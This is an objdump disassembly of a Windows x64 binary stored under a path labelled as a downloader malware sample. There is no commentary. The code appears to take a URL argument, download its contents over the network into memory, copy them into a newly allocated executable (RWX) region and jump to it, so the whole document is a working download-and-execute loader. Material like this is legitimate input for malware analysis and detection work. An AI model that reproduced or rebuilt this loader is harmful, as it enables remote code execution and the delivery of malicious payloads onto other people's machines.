
malware_samples/downloader/b568614fe33d732014980f0bb083e9abf45641f2dc230571eb3d63d6bc7f10b0.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	40 56                	rex push %rsi
   140001002:	57                   	push   %rdi
   140001003:	41 56                	push   %r14
   140001005:	41 57                	push   %r15
   140001007:	b8 b8 94 00 00       	mov    $0x94b8,%eax
   14000100c:	e8 af 03 00 00       	call   0x1400013c0
   140001011:	48 2b e0             	sub    %rax,%rsp
   140001014:	4c 8b d1             	mov    %rcx,%r10
   140001017:	48 8d 7c 24 40       	lea    0x40(%rsp),%rdi
   14000101c:	33 c0                	xor    %eax,%eax
   14000101e:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140001023:	49 8b f0             	mov    %r8,%rsi
   140001026:	4c 8b f2             	mov    %rdx,%r14
   140001029:	b9 68 00 00 00       	mov    $0x68,%ecx
   14000102e:	45 33 c0             	xor    %r8d,%r8d
   140001031:	f3 aa                	rep stos %al,(%rdi)
   140001033:	48 8d 84 24 b0 00 00 	lea    0xb0(%rsp),%rax
   14000103a:	00 
   14000103b:	c7 44 24 40 68 00 00 	movl   $0x68,0x40(%rsp)
   140001042:	00 
   140001043:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140001048:	33 d2                	xor    %edx,%edx
   14000104a:	48 8d 84 24 b0 04 00 	lea    0x4b0(%rsp),%rax
   140001051:	00 
   140001052:	c7 44 24 60 00 02 00 	movl   $0x200,0x60(%rsp)
   140001059:	00 
   14000105a:	49 8b ca             	mov    %r10,%rcx
   14000105d:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   140001064:	00 
   140001065:	45 32 ff             	xor    %r15b,%r15b
   140001068:	c7 84 24 90 00 00 00 	movl   $0x800,0x90(%rsp)
   14000106f:	00 08 00 00 
   140001073:	ff 15 ff 0f 00 00    	call   *0xfff(%rip)        # 0x140002078
   140001079:	85 c0                	test   %eax,%eax
   14000107b:	0f 84 47 02 00 00    	je     0x1400012c8
   140001081:	33 ff                	xor    %edi,%edi
   140001083:	4c 89 a4 24 f0 94 00 	mov    %r12,0x94f0(%rsp)
   14000108a:	00 
   14000108b:	45 33 c9             	xor    %r9d,%r9d
   14000108e:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140001092:	45 33 c0             	xor    %r8d,%r8d
   140001095:	48 8d 0d 04 10 00 00 	lea    0x1004(%rip),%rcx        # 0x1400020a0
   14000109c:	33 d2                	xor    %edx,%edx
   14000109e:	ff 15 c4 0f 00 00    	call   *0xfc4(%rip)        # 0x140002068
   1400010a4:	4c 8b e0             	mov    %rax,%r12
   1400010a7:	48 85 c0             	test   %rax,%rax
   1400010aa:	0f 84 12 02 00 00    	je     0x1400012c2
   1400010b0:	44 0f b7 44 24 64    	movzwl 0x64(%rsp),%r8d
   1400010b6:	48 8d 94 24 b0 00 00 	lea    0xb0(%rsp),%rdx
   1400010bd:	00 
   1400010be:	45 33 c9             	xor    %r9d,%r9d
   1400010c1:	4c 89 ac 24 b0 94 00 	mov    %r13,0x94b0(%rsp)
   1400010c8:	00 
   1400010c9:	48 8b c8             	mov    %rax,%rcx
   1400010cc:	ff 15 be 0f 00 00    	call   *0xfbe(%rip)        # 0x140002090
   1400010d2:	4c 8b e8             	mov    %rax,%r13
   1400010d5:	48 85 c0             	test   %rax,%rax
   1400010d8:	0f 84 b9 01 00 00    	je     0x140001297
   1400010de:	83 7c 24 54 02       	cmpl   $0x2,0x54(%rsp)
   1400010e3:	4c 8d 84 24 b0 04 00 	lea    0x4b0(%rsp),%r8
   1400010ea:	00 
   1400010eb:	8b cf                	mov    %edi,%ecx
   1400010ed:	48 89 ac 24 e8 94 00 	mov    %rbp,0x94e8(%rsp)
   1400010f4:	00 
   1400010f5:	b8 00 00 80 00       	mov    $0x800000,%eax
   1400010fa:	48 8d 15 af 0f 00 00 	lea    0xfaf(%rip),%rdx        # 0x1400020b0
   140001101:	0f 44 c8             	cmove  %eax,%ecx
   140001104:	45 33 c9             	xor    %r9d,%r9d
   140001107:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   14000110b:	49 8b cd             	mov    %r13,%rcx
   14000110e:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140001113:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001118:	ff 15 3a 0f 00 00    	call   *0xf3a(%rip)        # 0x140002058
   14000111e:	48 8b e8             	mov    %rax,%rbp
   140001121:	48 85 c0             	test   %rax,%rax
   140001124:	0f 84 5c 01 00 00    	je     0x140001286
   14000112a:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   14000112f:	45 33 c9             	xor    %r9d,%r9d
   140001132:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140001136:	45 33 c0             	xor    %r8d,%r8d
   140001139:	33 d2                	xor    %edx,%edx
   14000113b:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   14000113f:	48 8b c8             	mov    %rax,%rcx
   140001142:	ff 15 40 0f 00 00    	call   *0xf40(%rip)        # 0x140002088
   140001148:	85 c0                	test   %eax,%eax
   14000114a:	0f 84 2d 01 00 00    	je     0x14000127d
   140001150:	33 d2                	xor    %edx,%edx
   140001152:	48 8b cd             	mov    %rbp,%rcx
   140001155:	ff 15 05 0f 00 00    	call   *0xf05(%rip)        # 0x140002060
   14000115b:	85 c0                	test   %eax,%eax
   14000115d:	0f 84 1a 01 00 00    	je     0x14000127d
   140001163:	4c 8d 8c 24 f8 94 00 	lea    0x94f8(%rsp),%r9
   14000116a:	00 
   14000116b:	49 89 3e             	mov    %rdi,(%r14)
   14000116e:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   140001174:	89 3e                	mov    %edi,(%rsi)
   140001176:	48 8d 94 24 b0 14 00 	lea    0x14b0(%rsp),%rdx
   14000117d:	00 
   14000117e:	48 8b cd             	mov    %rbp,%rcx
   140001181:	41 b7 01             	mov    $0x1,%r15b
   140001184:	ff 15 e6 0e 00 00    	call   *0xee6(%rip)        # 0x140002070
   14000118a:	85 c0                	test   %eax,%eax
   14000118c:	0f 84 eb 00 00 00    	je     0x14000127d
   140001192:	48 89 9c 24 e0 94 00 	mov    %rbx,0x94e0(%rsp)
   140001199:	00 
   14000119a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400011a0:	8b 84 24 f8 94 00 00 	mov    0x94f8(%rsp),%eax
   1400011a7:	85 c0                	test   %eax,%eax
   1400011a9:	0f 84 c6 00 00 00    	je     0x140001275
   1400011af:	8b 0e                	mov    (%rsi),%ecx
   1400011b1:	49 8b 1e             	mov    (%r14),%rbx
   1400011b4:	48 8d 3c 01          	lea    (%rcx,%rax,1),%rdi
   1400011b8:	ff 15 5a 0e 00 00    	call   *0xe5a(%rip)        # 0x140002018
   1400011be:	33 d2                	xor    %edx,%edx
   1400011c0:	48 8b c8             	mov    %rax,%rcx
   1400011c3:	48 85 db             	test   %rbx,%rbx
   1400011c6:	74 0e                	je     0x1400011d6
   1400011c8:	4c 8b cf             	mov    %rdi,%r9
   1400011cb:	4c 8b c3             	mov    %rbx,%r8
   1400011ce:	ff 15 5c 0e 00 00    	call   *0xe5c(%rip)        # 0x140002030
   1400011d4:	eb 09                	jmp    0x1400011df
   1400011d6:	4c 8b c7             	mov    %rdi,%r8
   1400011d9:	ff 15 49 0e 00 00    	call   *0xe49(%rip)        # 0x140002028
   1400011df:	48 85 c0             	test   %rax,%rax
   1400011e2:	74 72                	je     0x140001256
   1400011e4:	48 63 8c 24 f8 94 00 	movslq 0x94f8(%rsp),%rcx
   1400011eb:	00 
   1400011ec:	44 8b 06             	mov    (%rsi),%r8d
   1400011ef:	48 8b d1             	mov    %rcx,%rdx
   1400011f2:	49 89 06             	mov    %rax,(%r14)
   1400011f5:	49 03 c0             	add    %r8,%rax
   1400011f8:	85 c9                	test   %ecx,%ecx
   1400011fa:	7e 2b                	jle    0x140001227
   1400011fc:	48 8d bc 24 b0 14 00 	lea    0x14b0(%rsp),%rdi
   140001203:	00 
   140001204:	48 2b f8             	sub    %rax,%rdi
   140001207:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000120e:	00 00 
   140001210:	0f b6 0c 07          	movzbl (%rdi,%rax,1),%ecx
   140001214:	88 08                	mov    %cl,(%rax)
   140001216:	48 8d 40 01          	lea    0x1(%rax),%rax
   14000121a:	48 83 ea 01          	sub    $0x1,%rdx
   14000121e:	75 f0                	jne    0x140001210
   140001220:	8b 8c 24 f8 94 00 00 	mov    0x94f8(%rsp),%ecx
   140001227:	41 8d 04 08          	lea    (%r8,%rcx,1),%eax
   14000122b:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   140001231:	48 8b cd             	mov    %rbp,%rcx
   140001234:	89 06                	mov    %eax,(%rsi)
   140001236:	4c 8d 8c 24 f8 94 00 	lea    0x94f8(%rsp),%r9
   14000123d:	00 
   14000123e:	48 8d 94 24 b0 14 00 	lea    0x14b0(%rsp),%rdx
   140001245:	00 
   140001246:	ff 15 24 0e 00 00    	call   *0xe24(%rip)        # 0x140002070
   14000124c:	85 c0                	test   %eax,%eax
   14000124e:	0f 85 4c ff ff ff    	jne    0x1400011a0
   140001254:	eb 1f                	jmp    0x140001275
   140001256:	49 8b 3e             	mov    (%r14),%rdi
   140001259:	48 85 ff             	test   %rdi,%rdi
   14000125c:	74 14                	je     0x140001272
   14000125e:	ff 15 b4 0d 00 00    	call   *0xdb4(%rip)        # 0x140002018
   140001264:	4c 8b c7             	mov    %rdi,%r8
   140001267:	33 d2                	xor    %edx,%edx
   140001269:	48 8b c8             	mov    %rax,%rcx
   14000126c:	ff 15 c6 0d 00 00    	call   *0xdc6(%rip)        # 0x140002038
   140001272:	45 32 ff             	xor    %r15b,%r15b
   140001275:	48 8b 9c 24 e0 94 00 	mov    0x94e0(%rsp),%rbx
   14000127c:	00 
   14000127d:	48 8b cd             	mov    %rbp,%rcx
   140001280:	ff 15 fa 0d 00 00    	call   *0xdfa(%rip)        # 0x140002080
   140001286:	49 8b cd             	mov    %r13,%rcx
   140001289:	ff 15 f1 0d 00 00    	call   *0xdf1(%rip)        # 0x140002080
   14000128f:	48 8b ac 24 e8 94 00 	mov    0x94e8(%rsp),%rbp
   140001296:	00 
   140001297:	49 8b cc             	mov    %r12,%rcx
   14000129a:	ff 15 e0 0d 00 00    	call   *0xde0(%rip)        # 0x140002080
   1400012a0:	4c 8b ac 24 b0 94 00 	mov    0x94b0(%rsp),%r13
   1400012a7:	00 
   1400012a8:	41 0f b6 c7          	movzbl %r15b,%eax
   1400012ac:	4c 8b a4 24 f0 94 00 	mov    0x94f0(%rsp),%r12
   1400012b3:	00 
   1400012b4:	48 81 c4 b8 94 00 00 	add    $0x94b8,%rsp
   1400012bb:	41 5f                	pop    %r15
   1400012bd:	41 5e                	pop    %r14
   1400012bf:	5f                   	pop    %rdi
   1400012c0:	5e                   	pop    %rsi
   1400012c1:	c3                   	ret
   1400012c2:	41 0f b6 c7          	movzbl %r15b,%eax
   1400012c6:	eb e4                	jmp    0x1400012ac
   1400012c8:	41 0f b6 c7          	movzbl %r15b,%eax
   1400012cc:	48 81 c4 b8 94 00 00 	add    $0x94b8,%rsp
   1400012d3:	41 5f                	pop    %r15
   1400012d5:	41 5e                	pop    %r14
   1400012d7:	5f                   	pop    %rdi
   1400012d8:	5e                   	pop    %rsi
   1400012d9:	c3                   	ret
   1400012da:	cc                   	int3
   1400012db:	cc                   	int3
   1400012dc:	cc                   	int3
   1400012dd:	cc                   	int3
   1400012de:	cc                   	int3
   1400012df:	cc                   	int3
   1400012e0:	48 83 ec 38          	sub    $0x38,%rsp
   1400012e4:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   1400012eb:	00 
   1400012ec:	ff 15 0e 0d 00 00    	call   *0xd0e(%rip)        # 0x140002000
   1400012f2:	48 8b c8             	mov    %rax,%rcx
   1400012f5:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400012fa:	ff 15 48 0d 00 00    	call   *0xd48(%rip)        # 0x140002048
   140001300:	83 7c 24 20 01       	cmpl   $0x1,0x20(%rsp)
   140001305:	0f 8e 92 00 00 00    	jle    0x14000139d
   14000130b:	48 8b 48 08          	mov    0x8(%rax),%rcx
   14000130f:	4c 8d 44 24 24       	lea    0x24(%rsp),%r8
   140001314:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140001319:	e8 e2 fc ff ff       	call   0x140001000
   14000131e:	84 c0                	test   %al,%al
   140001320:	74 7b                	je     0x14000139d
   140001322:	8b 54 24 24          	mov    0x24(%rsp),%edx
   140001326:	33 c9                	xor    %ecx,%ecx
   140001328:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   14000132e:	44 8d 49 40          	lea    0x40(%rcx),%r9d
   140001332:	ff 15 d0 0c 00 00    	call   *0xcd0(%rip)        # 0x140002008
   140001338:	4c 8b d0             	mov    %rax,%r10
   14000133b:	48 85 c0             	test   %rax,%rax
   14000133e:	74 3f                	je     0x14000137f
   140001340:	48 63 54 24 24       	movslq 0x24(%rsp),%rdx
   140001345:	48 85 d2             	test   %rdx,%rdx
   140001348:	7e 27                	jle    0x140001371
   14000134a:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
   14000134f:	48 8b c8             	mov    %rax,%rcx
   140001352:	4c 2b c8             	sub    %rax,%r9
   140001355:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000135c:	00 00 00 00 
   140001360:	41 0f b6 04 09       	movzbl (%r9,%rcx,1),%eax
   140001365:	88 01                	mov    %al,(%rcx)
   140001367:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   14000136b:	48 83 ea 01          	sub    $0x1,%rdx
   14000136f:	75 ef                	jne    0x140001360
   140001371:	41 ff d2             	call   *%r10
   140001374:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140001379:	ff 15 91 0c 00 00    	call   *0xc91(%rip)        # 0x140002010
   14000137f:	48 83 7c 24 28 00    	cmpq   $0x0,0x28(%rsp)
   140001385:	74 16                	je     0x14000139d
   140001387:	ff 15 8b 0c 00 00    	call   *0xc8b(%rip)        # 0x140002018
   14000138d:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140001392:	33 d2                	xor    %edx,%edx
   140001394:	48 8b c8             	mov    %rax,%rcx
   140001397:	ff 15 9b 0c 00 00    	call   *0xc9b(%rip)        # 0x140002038
   14000139d:	33 c9                	xor    %ecx,%ecx
   14000139f:	ff 15 7b 0c 00 00    	call   *0xc7b(%rip)        # 0x140002020
   1400013a5:	cc                   	int3
   1400013a6:	cc                   	int3
   1400013a7:	cc                   	int3
   1400013a8:	cc                   	int3
   1400013a9:	cc                   	int3
   1400013aa:	cc                   	int3
   1400013ab:	cc                   	int3
   1400013ac:	cc                   	int3
   1400013ad:	cc                   	int3
   1400013ae:	cc                   	int3
   1400013af:	cc                   	int3
   1400013b0:	cc                   	int3
   1400013b1:	cc                   	int3
   1400013b2:	cc                   	int3
   1400013b3:	cc                   	int3
   1400013b4:	cc                   	int3
   1400013b5:	cc                   	int3
   1400013b6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400013bd:	00 00 00 
   1400013c0:	48 83 ec 10          	sub    $0x10,%rsp
   1400013c4:	4c 89 14 24          	mov    %r10,(%rsp)
   1400013c8:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   1400013cd:	4d 33 db             	xor    %r11,%r11
   1400013d0:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   1400013d5:	4c 2b d0             	sub    %rax,%r10
   1400013d8:	4d 0f 42 d3          	cmovb  %r11,%r10
   1400013dc:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   1400013e3:	00 00 
   1400013e5:	4d 3b d3             	cmp    %r11,%r10
   1400013e8:	f2 73 17             	bnd jae 0x140001402
   1400013eb:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   1400013f1:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   1400013f8:	41 c6 03 00          	movb   $0x0,(%r11)
   1400013fc:	4d 3b d3             	cmp    %r11,%r10
   1400013ff:	f2 75 ef             	bnd jne 0x1400013f1
   140001402:	4c 8b 14 24          	mov    (%rsp),%r10
   140001406:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   14000140b:	48 83 c4 10          	add    $0x10,%rsp
   14000140f:	f2 c3                	bnd ret
